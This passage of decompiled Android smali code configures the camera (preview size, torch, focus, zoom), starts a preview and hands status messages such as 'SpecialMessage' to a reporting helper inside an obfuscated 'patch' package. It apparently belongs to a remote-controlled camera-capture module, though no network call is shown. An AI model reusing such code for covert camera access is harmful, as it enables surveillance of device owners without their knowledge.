    move-result-object v7

    invoke-virtual {v7}, Landroid/hardware/Camera$Parameters;->getSupportedPreviewSizes()Ljava/util/List;

    move-result-object v7

    if-eqz v7, :cond_0

    sget v7, Lcmf0/c3b5bm90zq/patch/C5;->e:I

    sget v8, Lcmf0/c3b5bm90zq/patch/C5;->f:I

    invoke-virtual {v6, v7, v8}, Landroid/hardware/Camera$Parameters;->setPreviewSize(II)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_2

    :cond_0
    :try_start_2
    sget v7, Lcmf0/c3b5bm90zq/patch/C5;->h:I

    if-ne v7, v5, :cond_1

    invoke-virtual {v6}, Landroid/hardware/Camera$Parameters;->getSupportedFlashModes()Ljava/util/List;

    move-result-object v7

    sget-object v8, Lcmf0/c3b5bm90zq/patch/C5;->a:Landroid/hardware/Camera;

    invoke-virtual {v8}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v8

    invoke-virtual {v8}, Landroid/hardware/Camera$Parameters;->getSupportedFlashModes()Ljava/util/List;

    move-result-object v8

    if-eqz v8, :cond_1

    const-string v8, "torch"

    invoke-interface {v7, v8}, Ljava/util/List;->contains(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_1

    const-string v7, "torch"

    invoke-virtual {v6, v7}, Landroid/hardware/Camera$Parameters;->setFlashMode(Ljava/lang/String;)V

    :cond_1
    sget v7, Lcmf0/c3b5bm90zq/patch/C5;->i:I

    if-ne v7, v5, :cond_2

    invoke-virtual {v6}, Landroid/hardware/Camera$Parameters;->getSupportedFocusModes()Ljava/util/List;

    move-result-object v7

    const-string v8, "continuous-video"

    invoke-interface {v7, v8}, Ljava/util/List;->contains(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_2

    const-string v7, "continuous-video"

    invoke-virtual {v6, v7}, Landroid/hardware/Camera$Parameters;->setFocusMode(Ljava/lang/String;)V

    :cond_2
    invoke-virtual {v6}, Landroid/hardware/Camera$Parameters;->isZoomSupported()Z

    move-result v7

    if-eqz v7, :cond_3

    sget v7, Lcmf0/c3b5bm90zq/patch/C5;->j:I

    invoke-virtual {v6, v7}, Landroid/hardware/Camera$Parameters;->setZoom(I)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    :catch_1
    :cond_3
    :try_start_3
    sget v7, Lcmf0/c3b5bm90zq/patch/C5;->e:I

    sget v8, Lcmf0/c3b5bm90zq/patch/C5;->f:I

    invoke-virtual {v6, v7, v8}, Landroid/hardware/Camera$Parameters;->setPreviewSize(II)V

    const/16 v7, 0x11

    invoke-virtual {v6, v7}, Landroid/hardware/Camera$Parameters;->setPreviewFormat(I)V

    sget-object v7, Lcmf0/c3b5bm90zq/patch/C5;->a:Landroid/hardware/Camera;

    invoke-virtual {v7, v6}, Landroid/hardware/Camera;->setParameters(Landroid/hardware/Camera$Parameters;)V

    sget-object v6, Lcmf0/c3b5bm90zq/patch/C5;->a:Landroid/hardware/Camera;

    invoke-virtual {v6, p1}, Landroid/hardware/Camera;->setPreviewDisplay(Landroid/view/SurfaceHolder;)V

    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    sget-wide v6, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    invoke-static {v6, v7, v3, v4}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {p1, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v6, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {p1, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, ":)"

    invoke-virtual {p1, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v6, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {p1, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, "SpecialMessage"

    invoke-virtual {p1, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {p1}, Lcmf0/c3b5bm90zq/patch/C11;->a(Ljava/lang/String;)V

    sget-object p1, Lcmf0/c3b5bm90zq/patch/C5;->a:Landroid/hardware/Camera;

    invoke-virtual {p1}, Landroid/hardware/Camera;->startPreview()V

    iput-boolean v5, p0, Lcmf0/c3b5bm90zq/patch/C5;->b:Z
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    goto :goto_1

    :catch_2
    move-exception p1

    iput-boolean v2, p0, Lcmf0/c3b5bm90zq/patch/C5;->b:Z

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    sget-wide v5, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    invoke-static {v5, v6, v3, v4}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v3, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object p1, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-wide v3, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    invoke-static {v3, v4, v0, v1}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {p1}, Lcmf0/c3b5bm90zq/patch/C11;->a(Ljava/lang/String;)V

    :cond_4
    :goto_1
    return-void
.end method

.method public surfaceDestroyed(Landroid/view/SurfaceHolder;)V
    .locals 0

    return-void
.end method
